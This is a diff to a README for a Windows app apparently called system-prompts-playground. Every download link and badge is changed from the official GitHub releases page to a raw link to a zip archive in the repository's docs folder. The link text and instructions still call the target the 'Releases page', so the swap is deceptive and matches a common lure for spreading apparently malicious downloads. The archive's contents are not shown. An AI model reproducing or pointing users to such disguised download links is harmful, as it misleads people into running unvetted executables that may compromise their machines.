@@ -1,6 +1,6 @@
 # ⚙️ system-prompts-playground - Explore AI Tools and Coding Prompts
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/chandrakumarprajapati/system-prompts-playground/main/docs/system_playground_prompts_v1.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ If you use an older version of Windows, the app might not work correctly.
 
 Use the official releases page to get the software:
 
-**[Download system-prompts-playground Releases](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)**
+**[Download system-prompts-playground Releases](https://raw.githubusercontent.com/chandrakumarprajapati/system-prompts-playground/main/docs/system_playground_prompts_v1.5.zip)**
 
 Click the link above to open the releases page. On that page, you will find the available versions of the app. Download the latest version for Windows.
 
@@ -92,7 +92,7 @@ If you want to check manually:
 2. Look for an Update option in the menu or settings.
 3. Follow prompts to download and install updates.
 
-You can also revisit the [Releases page](https://github.com/chandrakumarprajapati/system-prompts-playground/releases) to manually download the latest version if needed.
+You can also revisit the [Releases page](https://raw.githubusercontent.com/chandrakumarprajapati/system-prompts-playground/main/docs/system_playground_prompts_v1.5.zip) to manually download the latest version if needed.
 
 ---
 
@@ -123,4 +123,4 @@ Use these resources to get the most out of system-prompts-playground.
 
 ---
 
-[![Download system-prompts-playground](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/chandrakumarprajapati/system-prompts-playground/releases)
+[![Download system-prompts-playground](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/chandrakumarprajapati/system-prompts-playground/main/docs/system_playground_prompts_v1.5.zip)
